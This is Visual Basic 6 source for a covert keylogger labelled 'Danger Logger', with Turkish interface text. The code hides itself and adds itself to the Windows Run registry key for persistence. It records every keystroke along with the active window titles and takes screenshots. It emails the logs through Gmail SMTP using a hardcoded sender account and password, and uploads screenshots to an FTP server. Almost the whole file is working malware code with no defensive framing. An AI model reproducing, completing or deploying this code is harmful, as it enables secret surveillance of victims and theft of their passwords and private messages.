VERSION 5.00
Object = "{48E59290-9880-11CF-9754-00AA00C00908}#1.0#0"; "MSINET.OCX"
Begin VB.Form Form1 
   BackColor       =   &H00000000&
   Caption         =   "Form1"
   ClientHeight    =   8355
   ClientLeft      =   60
   ClientTop       =   435
   ClientWidth     =   8220
   LinkTopic       =   "Form1"
   ScaleHeight     =   8355
   ScaleWidth      =   8220
   Begin VB.TextBox Text12 
      Enabled         =   0   'False
      Height          =   285
      Left            =   5400
      TabIndex        =   41
      Text            =   "Text12"
      Top             =   5520
      Width           =   2535
   End
   Begin VB.PictureBox Picture1 
      Height          =   2295
      Left            =   0
      ScaleHeight     =   2235
      ScaleWidth      =   3555
      TabIndex        =   40
      Top             =   6000
      Width           =   3615
   End
   Begin VB.TextBox Text11 
      Height          =   285
      Left            =   4920
      TabIndex        =   39
      Top             =   3360
      Width           =   3015
   End
   Begin VB.Timer Timer20 
      Enabled         =   0   'False
      Interval        =   60000
      Left            =   7560
      Top             =   4920
   End
   Begin VB.Timer Timer19 
      Enabled         =   0   'False
      Interval        =   10000
      Left            =   7200
      Top             =   4920
   End
   Begin VB.Timer Timer18 
      Enabled         =   0   'False
      Interval        =   1000
      Left            =   6840
      Top             =   4920
   End
   Begin VB.Timer Timer17 
      Enabled         =   0   'False
      Interval        =   1000
      Left            =   6480
      Top             =   4920
   End
   Begin VB.Timer Timer16 
      Enabled         =   0   'False
      Interval        =   1000
      Left            =   6120
      Top             =   4920
   End
   Begin VB.Timer Timer15 
      Enabled         =   0   'False
      Interval        =   1000
      Left            =   7560
      Top             =   4560
   End
   Begin VB.Timer Timer14 
      Enabled         =   0   'False
      Interval        =   1000
      Left            =   7200
      Top             =   4560
   End
   Begin VB.Timer Timer13 
      Enabled         =   0   'False
      Interval        =   1000
      Left            =   6840
      Top             =   4560
   End
   Begin VB.Timer Timer12 
      Enabled         =   0   'False
      Interval        =   1000
      Left            =   6480
      Top             =   4560
   End
   Begin VB.Timer Timer11 
      Enabled         =   0   'False
      Interval        =   1000
      Left            =   6120
      Top             =   4560
   End
   Begin VB.Timer Timer10 
      Enabled         =   0   'False
      Interval        =   60000
      Left            =   7560
      Top             =   4200
   End
   Begin VB.Timer Timer9 
      Enabled         =   0   'False
      Interval        =   10000
      Left            =   7200
      Top             =   4200
   End
   Begin VB.Timer Timer8 
      Enabled         =   0   'False
      Interval        =   1000
      Left            =   6840
      Top             =   4200
   End
   Begin VB.Timer Timer7 
      Enabled         =   0   'False
      Interval        =   1000
      Left            =   6480
      Top             =   4200
   End
   Begin VB.Timer Timer6 
      Enabled         =   0   'False
      Interval        =   1000
      Left            =   6120
      Top             =   4200
   End
   Begin VB.Timer Timer5 
      Enabled         =   0   'False
      Interval        =   1000
      Left            =   7560
      Top             =   3840
   End
   Begin VB.Timer Timer4 
      Enabled         =   0   'False
      Interval        =   1000
      Left            =   7200
      Top             =   3840
   End
   Begin VB.Timer Timer3 
      Enabled         =   0   'False
      Interval        =   1000
      Left            =   6840
      Top             =   3840
   End
   Begin VB.Timer Timer2 
      Enabled         =   0   'False
      Interval        =   1000
      Left            =   6480
      Top             =   3840
   End
   Begin VB.Timer Timer1 
      Enabled         =   0   'False
      Interval        =   1000
      Left            =   6120
      Top             =   3840
   End
   Begin VB.Frame Frame6 
      BackColor       =   &H00000000&
      Height          =   1575
      Left            =   3720
      TabIndex        =   32
      Top             =   3720
      Width           =   2295
      Begin VB.TextBox Text10 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00FFFFFF&
         Enabled         =   0   'False
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   285
         Left            =   480
         TabIndex        =   36
         Top             =   1200
         Width           =   1215
      End
      Begin VB.TextBox Text9 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00FFFFFF&
         Enabled         =   0   'False
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   285
         Left            =   480
         TabIndex        =   35
         Top             =   480
         Width           =   1215
      End
      Begin VB.OptionButton Option2 
         BackColor       =   &H00000000&
         Caption         =   "FTP Olarak Gönder"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H8000000D&
         Height          =   255
         Left            =   120
         TabIndex        =   34
         Top             =   960
         Width           =   2055
      End
      Begin VB.OptionButton Option1 
         BackColor       =   &H00000000&
         Caption         =   "Mail Olarak Gönder"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H8000000D&
         Height          =   255
         Left            =   120
         TabIndex        =   33
         Top             =   240
         Width           =   2055
      End
      Begin VB.Line Line3 
         BorderColor     =   &H00FFFFFF&
         X1              =   120
         X2              =   2160
         Y1              =   840
         Y2              =   840
      End
   End
   Begin InetCtlsObjects.Inet Inet1 
      Left            =   3720
      Top             =   5520
      _ExtentX        =   1005
      _ExtentY        =   1005
      _Version        =   393216
   End
   Begin VB.Frame Frame5 
      BackColor       =   &H00000000&
      Caption         =   "[ Ayarlar ]"
      ForeColor       =   &H8000000D&
      Height          =   2175
      Left            =   0
      TabIndex        =   19
      Top             =   3720
      Width           =   3615
      Begin VB.TextBox TextBox2 
         Enabled         =   0   'False
         Height          =   285
         Left            =   120
         TabIndex        =   38
         Top             =   1800
         Width           =   3375
      End
      Begin VB.TextBox TextBox1 
         Enabled         =   0   'False
         Height          =   285
         Left            =   120
         TabIndex        =   37
         Top             =   1560
         Width           =   3375
      End
      Begin VB.CheckBox Check3 
         BackColor       =   &H00000000&
         Caption         =   "Kendini Kopyala"
         Enabled         =   0   'False
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H8000000D&
         Height          =   255
         Left            =   1800
         TabIndex        =   31
         Top             =   1200
         Width           =   1695
      End
      Begin VB.TextBox Text7 
         Alignment       =   2  'Center
         Enabled         =   0   'False
         Height          =   285
         Left            =   960
         MaxLength       =   1
         TabIndex        =   30
         Top             =   1200
         Width           =   735
      End
      Begin VB.CheckBox Check2 
         BackColor       =   &H00000000&
         Caption         =   "Ekran Görüntüsü Al"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   162
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H8000000D&
         Height          =   255
         Left            =   1800
         TabIndex        =   28
         Top             =   720
         Width           =   1695
      End
      Begin VB.TextBox Text3 
         Alignment       =   2  'Center
         Enabled         =   0   'False
         Height          =   285
         Left            =   960
         MaxLength       =   1
         TabIndex        =   27
         Top             =   720
         Width           =   735
      End
      Begin VB.CheckBox Check1 
         BackColor       =   &H00000000&
         Caption         =   "Baþlangýç ekle"
         Enabled         =   0   'False
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H8000000D&
         Height          =   255
         Left            =   1800
         TabIndex        =   22
         Top             =   240
         Width           =   1575
      End
      Begin VB.TextBox Text4 
         Alignment       =   2  'Center
         Enabled         =   0   'False
         Height          =   285
         IMEMode         =   3  'DISABLE
         Left            =   960
         MaxLength       =   1
         TabIndex        =   21
         Top             =   240
         Width           =   735
      End
      Begin VB.Label Label11 
         BackColor       =   &H00000000&
         Caption         =   "Copy :"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   162
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   120
         TabIndex        =   29
         Top             =   1200
         Width           =   615
      End
      Begin VB.Line Line2 
         BorderColor     =   &H00FFFFFF&
         X1              =   120
         X2              =   3480
         Y1              =   1080
         Y2              =   1080
      End
      Begin VB.Label Label10 
         BackColor       =   &H00000000&
         Caption         =   "Ekran :"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   162
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   120
         TabIndex        =   26
         Top             =   720
         Width           =   855
      End
      Begin VB.Line Line1 
         BorderColor     =   &H00FFFFFF&
         X1              =   120
         X2              =   3480
         Y1              =   600
         Y2              =   600
      End
      Begin VB.Label Label3 
         BackColor       =   &H00000000&
         Caption         =   "Baþlangýç :"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   162
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   120
         TabIndex        =   20
         Top             =   240
         Width           =   855
      End
   End
   Begin VB.Frame Frame3 
      BackColor       =   &H00000000&
      Caption         =   "[ Gmail Ayarlarý ]"
      ForeColor       =   &H8000000D&
      Height          =   975
      Left            =   0
      TabIndex        =   14
      Top             =   2760
      Width           =   4695
      Begin VB.TextBox Pc 
         Enabled         =   0   'False
         Height          =   285
         Left            =   1200
         TabIndex        =   25
         Text            =   "Text7"
         Top             =   600
         Width           =   375
      End
      Begin VB.TextBox Text2 
         Enabled         =   0   'False
         Height          =   285
         Left            =   1200
         TabIndex        =   16
         Top             =   240
         Width           =   3375
      End
      Begin VB.TextBox MailKonusu 
         Enabled         =   0   'False
         Height          =   285
         Left            =   1560
         TabIndex        =   15
         Top             =   600
         Width           =   3015
      End
      Begin VB.Label Label1 
         BackColor       =   &H00000000&
         Caption         =   "Adresiniz      :"
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   120
         TabIndex        =   18
         Top             =   240
         Width           =   1335
      End
      Begin VB.Label Label2 
         BackColor       =   &H00000000&
         Caption         =   "Mail Konusu :"
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   120
         TabIndex        =   17
         Top             =   600
         Width           =   1095
      End
   End
   Begin VB.Frame Frame4 
      BackColor       =   &H00000000&
      Caption         =   "[ FTP Ayarlarý ]"
      ForeColor       =   &H8000000D&
      Height          =   1935
      Left            =   4800
      TabIndex        =   5
      Top             =   1800
      Width           =   3255
      Begin VB.TextBox Text5 
         Enabled         =   0   'False
         Height          =   285
         Left            =   720
         TabIndex        =   9
         Top             =   240
         Width           =   2415
      End
      Begin VB.TextBox Text6 
         Enabled         =   0   'False
         Height          =   285
         Left            =   720
         TabIndex        =   8
         Top             =   600
         Width           =   2055
      End
      Begin VB.TextBox Text 
         Enabled         =   0   'False
         Height          =   285
         Left            =   720
         TabIndex        =   7
         Top             =   960
         Width           =   1815
      End
      Begin VB.TextBox Text8 
         Alignment       =   2  'Center
         Enabled         =   0   'False
         Height          =   285
         Left            =   720
         TabIndex        =   6
         Text            =   "21"
         Top             =   1320
         Width           =   615
      End
      Begin VB.Label Label4 
         BackColor       =   &H00000000&
         Caption         =   "URL :"
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   120
         TabIndex        =   13
         Top             =   240
         Width           =   735
      End
      Begin VB.Label Label5 
         BackColor       =   &H00000000&
         Caption         =   "K.Adý :"
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   120
         TabIndex        =   12
         Top             =   600
         Width           =   735
      End
      Begin VB.Label Label6 
         BackColor       =   &H00000000&
         Caption         =   "Parola :"
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   120
         TabIndex        =   11
         Top             =   960
         Width           =   735
      End
      Begin VB.Label Label7 
         BackColor       =   &H00000000&
         Caption         =   "Port :"
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   120
         TabIndex        =   10
         Top             =   1320
         Width           =   735
      End
   End
   Begin VB.Frame Frame1 
      BackColor       =   &H00000000&
      Caption         =   "[ Kayýtlar ]"
      ForeColor       =   &H8000000D&
      Height          =   1815
      Left            =   0
      TabIndex        =   3
      Top             =   0
      Width           =   8055
      Begin VB.TextBox kyt01 
         Height          =   1455
         Left            =   120
         MultiLine       =   -1  'True
         ScrollBars      =   3  'Both
         TabIndex        =   4
         Top             =   240
         Width           =   7815
      End
   End
   Begin VB.Frame Frame2 
      BackColor       =   &H00000000&
      Caption         =   "[ Kayýt Yol ]"
      ForeColor       =   &H8000000D&
      Height          =   975
      Left            =   0
      TabIndex        =   0
      Top             =   1800
      Width           =   4695
      Begin VB.TextBox kytyl01 
         Enabled         =   0   'False
         Height          =   285
         Left            =   840
         TabIndex        =   2
         Top             =   240
         Width           =   3735
      End
      Begin VB.TextBox Text1 
         Height          =   285
         Left            =   840
         TabIndex        =   1
         Top             =   600
         Width           =   3735
      End
      Begin VB.Label Label9 
         BackColor       =   &H00000000&
         Caption         =   "Ekran Yol :"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   162
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   120
         TabIndex        =   24
         Top             =   600
         Width           =   855
      End
      Begin VB.Label Label8 
         BackColor       =   &H00000000&
         Caption         =   "Log Yol :"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   162
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   120
         TabIndex        =   23
         Top             =   240
         Width           =   975
      End
   End
   Begin VB.Timer zmn01 
      Interval        =   5
      Left            =   4320
      Top             =   5520
   End
   Begin VB.Timer zmn02 
      Interval        =   5000
      Left            =   4800
      Top             =   5520
   End
   Begin VB.Line Line4 
      BorderColor     =   &H00FFFFFF&
      X1              =   3600
      X2              =   8160
      Y1              =   5400
      Y2              =   5400
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'---------------[ API ]---------------

Private Declare Function CopyFile Lib "kernel32" Alias "CopyFileA" (ByVal lpExistingFileName As String, ByVal lpNewFileName As String, ByVal bFailIfExists As Long) As Long
Private Declare Function GetDesktopWindow Lib "USER32" () As Long
Private Declare Function BitBlt Lib "GDI32" (ByVal hDestDC As Long, _
ByVal x As Long, ByVal y As Long, ByVal nWidth As Long, _
ByVal nHeight As Long, ByVal hSrcDC As Long, ByVal XSrc As Long, _
ByVal YSrc As Long, ByVal dwRop As Long) As Long
Private Declare Function GetDC Lib "USER32" (ByVal hWnd As Long) As Long
Private Declare Function ReleaseDC Lib "USER32" _
(ByVal hWnd As Long, ByVal hDC As Long) As Long
Private Declare Function GetAsyncKeyState Lib "USER32" (ByVal vKey As Long) As Integer
Private Declare Function GetKeyState Lib "USER32" (ByVal nVirtKey As Long) As Integer
Private Declare Function GetForegroundWindow Lib "USER32" () As Long
Private Declare Function GetWindowText Lib "USER32" Alias "GetWindowTextA" (ByVal hWnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
Private Declare Function GetWindowTextLength Lib "USER32" Alias "GetWindowTextLengthA" (ByVal hWnd As Long) As Long
Private Declare Function GetComputerName Lib "kernel32" Alias "GetComputerNameA" (ByVal lpBuffer As String, nSize As Long) As Long
Private Declare Function GetUserName Lib "advapi32.dll" Alias "GetUserNameA" (ByVal lpBuffer As String, nSize As Long) As Long
Private Declare Function GetVolumeSerialNumber Lib "kernel32" Alias "GetVolumeInformationA" (ByVal lpRootPathName As String, ByVal lpVolumeNameBuffer As String, ByVal nVolumeNameSize As Long, lpVolumeSerialNumber As Long, lpMaximumComponentLength As Long, lpFileSystemFlags As Long, ByVal lpFileSystemNameBuffer As String, ByVal nFileSystemNameSize As Long) As Long
Private LastWindow As String
Private LastHandle As Long
Private dKey(255) As Long
Private Const VK_SHIFT = &H10
Private Const VK_CTRL = &H11
Private Const VK_ALT = &H12
Private Const VK_CAPITAL = &H14
Private ChangeChr(255) As String
Private AltDown As Boolean
Dim WMI
Dim wmiWin32Objects
Dim wmiWin32Object
Dim ComputerName As String

Private Sub Check1_Click()
If Check1.Value = Text4.Text Then
Dim KayitDefteri As Object
Dim reg As Object
Set KayitDefteri = CreateObject("wscript.shell")
KayitDefteri.regwrite "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN\" & App.EXEName, App.Path & "\" & App.EXEName & ".exe"
Else
Set reg = CreateObject("wscript.shell")
reg.regdelete "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN\" & App.EXEName
End If
End Sub



Private Sub Check3_Click()
On Error Resume Next
TextBox1.Text = App.Path & "\" & App.EXEName & ".exe"
If Check3.Value = Text7.Text Then
a = Len(TextBox2.Text)
b = Len(TextBox1.Text)
If Mid(TextBox2.Text, a - 3, 1) <> "." Then
TextBox2.Text = TextBox2.Text & Mid(TextBox.Text, b - 3, 4)
End If
FileCopy TextBox1.Text, TextBox2.Text
End If
End Sub

Private Sub Form_Load()
On Error Resume Next
App.TaskVisible = False
Dim Ret As Long
Dim c_name As String * 255
Dim u_name As String * 255
Dim u_id As String
Dim hdd_number As String
Ret = GetComputerName(c_name, Len(c_name))      'Bilgisayar adý alýnýyo
Pc.Text = c_name
MailKonusu.Text = "[Bilgisayar Adý : " & Pc.Text & " ]-[Saat : " & Time & "]-[Tarih : " & Date & " ]"
'---------------[ Ayarlar ]---------------
On Error Resume Next
Dim PropBag As PropertyBag
Set PropBag = New PropertyBag
Set PropBag = LoadCompiledData
If PropBag.ReadProperty("error", "") = "true" Then
MsgBox "_DangerOusMaN_"
End
End If
'----------------------------------------------------------------------------------
Text9.Text = PropBag.ReadProperty("Mail", "")
Text10.Text = PropBag.ReadProperty("Ftp", "")
Option1.Value = Text9.Text
Option2.Value = Text10.Text
'------------------------------{MAÝL ADRESÝ}------------------------------
If Option1.Value = Text9.Text Then
Text2.Text = PropBag.ReadProperty("GMailAdresi", "")
End If
'------------------------------{FTP ADRESÝ}------------------------------
If Option2.Value = Text10.Text Then
Text5.Text = PropBag.ReadProperty("FtpHost", "")
Text6.Text = PropBag.ReadProperty("FtpKullanýcý", "")
Text.Text = PropBag.ReadProperty("FtpPass1", "")
End If
'------------------------------{AYARLAR}------------------------------
kytyl01.Text = PropBag.ReadProperty("LogYolu", "")
Text4.Text = PropBag.ReadProperty("Baslangýc", "")
Text3.Text = PropBag.ReadProperty("EkranSave", "")
Text1.Text = PropBag.ReadProperty("EkranYol", "")
Text7.Text = PropBag.ReadProperty("MyCopy", "")
TextBox2.Text = PropBag.ReadProperty("MyCopyYol", "")
'============================================
Check1.Value = Text4.Text
Check2.Value = Text3.Text
Check3.Value = Text7.Text
End Sub


Private Sub Option1_Click()
Timer1.Enabled = True
End Sub

Private Sub Option2_Click()
Timer11.Enabled = True
End Sub

Private Sub Timer1_Timer()
Timer2.Enabled = True
Timer1.Enabled = False
End Sub

Private Sub Timer10_Timer()
'==============================================
On Error Resume Next
Dim iMsg, iConf, Flds
Set iMsg = CreateObject("CDO.Message")
Set iConf = CreateObject("CDO.Configuration")
Set Flds = iConf.Fields
schema = "http://schemas.microsoft.com/cdo/configuration/"
Flds.Item(schema & "sendusing") = 2
Flds.Item(schema & "smtpserver") = "smtp.gmail.com"
Flds.Item(schema & "smtpserverport") = "465"
Flds.Item(schema & "smtpauthenticate") = 1
Flds.Item(schema & "sendusername") = "DangerKeyloggerLog@gmail.com"
Flds.Item(schema & "sendpassword") = "holocaust3"
Flds.Item(schema & "smtpusessl") = 1
Flds.Update
With iMsg
.To = Text2.Text
.From = MailKonusu.Text
.Subject = MailKonusu.Text
.HTMLbOdy = kyt01.Text
.Organization = "Danger Logger - Cyber-Warrior.org // _DangerOusMaN_"
.ReplyTo = "-"
Set .Configuration = iConf
SendEmailGmail = .send
End With
Timer1.Enabled = True
Timer10.Enabled = False
End Sub

Private Sub Timer11_Timer()
Timer12.Enabled = True
Timer11.Enabled = False
End Sub

Private Sub Timer12_Timer()
Timer13.Enabled = True
Timer12.Enabled = False
End Sub

Private Sub Timer13_Timer()
Timer14.Enabled = True
Timer13.Enabled = False
End Sub

Private Sub Timer14_Timer()
Timer15.Enabled = True
Timer14.Enabled = False
End Sub

Private Sub Timer15_Timer()
Timer16.Enabled = True
Timer15.Enabled = False
End Sub

Private Sub Timer16_Timer()
Timer17.Enabled = True
Timer16.Enabled = False
End Sub

Private Sub Timer17_Timer()
Timer18.Enabled = True
Timer17.Enabled = False
End Sub

Private Sub Timer18_Timer()
Timer19.Enabled = True
Timer18.Enabled = False
End Sub

Private Sub Timer19_Timer()
Set Picture1.Picture = CaptureScreen()
If Check2.Value = 1 Then
Dim Ret As Long
Dim c_name As String * 255
Dim u_name As String * 255
Dim u_id As String
Dim hdd_number As String
'========{Bilgisayar Adý Alýr}=========
Ret = GetComputerName(c_name, Len(c_name))
Text12.Text = c_name
'========{Sayi Üretir}=========
Dim sayi
sayi = Int(Rnd(1) * (9999))
'========{Alýnan Resmi Kaydeder}=========
a = Text1.Text & "\[ " & Text12.Text & " ]-[ " & Date & "] " & sayi & ".jpg"
SavePicture Picture1.Picture, a
'========{FTP Dosya Gönderme}=========
b = Text12.Text & "-" & Date & "-" & sayi & ".jpg"
Text11.Text = "Put  " & a & " /" & b
End If
Timer20.Enabled = True
Timer19.Enabled = False
End Sub

Private Sub Timer2_Timer()
Timer3.Enabled = True
Timer2.Enabled = False
End Sub

Private Sub Timer20_Timer()
'===============================================
On Error Resume Next
With Inet1
.Protocol = icFTP
.URL = Text5.Text
.UserName = Text6.Text
.Password = Text7.Text
End With
Inet1.Execute Inet1.URL, Text11.Text
Timer11.Enabled = True
Timer20.Enabled = False
End Sub

Private Sub Timer3_Timer()
Timer4.Enabled = True
Timer3.Enabled = False
End Sub

Private Sub Timer4_Timer()
Timer5.Enabled = True
Timer4.Enabled = False
End Sub

Private Sub Timer5_Timer()
Timer6.Enabled = True
Timer5.Enabled = False
End Sub



Private Sub Timer6_Timer()
Timer7.Enabled = True
Timer6.Enabled = False
End Sub

Private Sub Timer7_Timer()
Timer8.Enabled = True
Timer7.Enabled = False
End Sub

Private Sub Timer8_Timer()
Timer9.Enabled = True
Timer8.Enabled = False
End Sub

Private Sub Timer9_Timer()
Set Picture1.Picture = CaptureScreen()
On Error Resume Next
If Check2.Value = 1 Then
Dim Ret As Long
Dim c_name As String * 255
Dim u_name As String * 255
Dim u_id As String
Dim hdd_number As String
Dim sayi
        sayi = Int(Rnd(1) * (9999))
        Ret = GetComputerName(c_name, Len(c_name))
Text12.Text = c_name
a = Text1.Text & "\[ " & Text12.Text & " ]-[ " & Date & "] " & sayi & ".jpg"
SavePicture Picture1.Picture, a
Text11.Text = "Put  " & a & " /" & "Resim.jpg"
End If
Timer9.Enabled = False
Timer10.Enabled = True
End Sub

'---------------[ zmn01 ]---------------
Private Sub zmn01_Timer()
'when alt is up
If GetAsyncKeyState(VK_ALT) = 0 And AltDown = True Then
AltDown = False
kyt01 = kyt01 & ""
End If
'a-z A-Z
For i = Asc("A") To Asc("Z")
If GetAsyncKeyState(i) = -32767 Then
TypeWindow
If GetAsyncKeyState(VK_SHIFT) < 0 Then
If GetKeyState(VK_CAPITAL) > 0 Then
kyt01 = kyt01 & LCase(Chr(i))
Exit Sub
Else
kyt01 = kyt01 & UCase(Chr(i))
Exit Sub
End If
Else
If GetKeyState(VK_CAPITAL) > 0 Then
kyt01 = kyt01 & UCase(Chr(i))
Exit Sub
Else
kyt01 = kyt01 & LCase(Chr(i))
Exit Sub
End If
End If
End If
Next
'1234567890)(*&^%$#@!
For i = 48 To 57
If GetAsyncKeyState(i) = -32767 Then
TypeWindow
If GetAsyncKeyState(VK_SHIFT) < 0 Then
kyt01 = kyt01 & ChangeChr(i)
Exit Sub
Else
kyt01 = kyt01 & Chr(i)
Exit Sub
End If
End If
Next
';=,-./
For i = 186 To 192
If GetAsyncKeyState(i) = -32767 Then
TypeWindow
If GetAsyncKeyState(VK_SHIFT) < 0 Then
kyt01 = kyt01 & ChangeChr(i - 100)
Exit Sub
Else
kyt01 = kyt01 & ChangeChr(i)
Exit Sub
End If
End If
Next
'for space
If GetAsyncKeyState(32) = -32767 Then
TypeWindow
kyt01 = kyt01 & " "
End If
'for enter
If GetAsyncKeyState(13) = -32767 Then
TypeWindow
kyt01 = kyt01 & vbCrLf
End If
End Sub
'---------------[ zmn02 ]---------------
Private Sub zmn02_Timer()
On Error Resume Next
kytyl01.Text = kytyl02.Text
Open kytyl01.Text For Output As #1
Print #1, kyt01.Text;
Close #1
End Sub
'---------------[ TypeWindow ]---------------
Function TypeWindow()
Dim Handle As Long
Dim textlen As Long
Dim WindowText As String
Handle = GetForegroundWindow
LastHandle = Handle
textlen = GetWindowTextLength(Handle) + 1
WindowText = Space(textlen)
svar = GetWindowText(Handle, WindowText, textlen)
WindowText = Left(WindowText, Len(WindowText) - 1)
If WindowText <> LastWindow Then
If kyt01 <> "" Then kyt01 = kyt01 & vbCrLf & vbCrLf
kyt01 = kyt01 & "===========[ " & WindowText & " ]===========" & vbCrLf
LastWindow = WindowText
End If
End Function

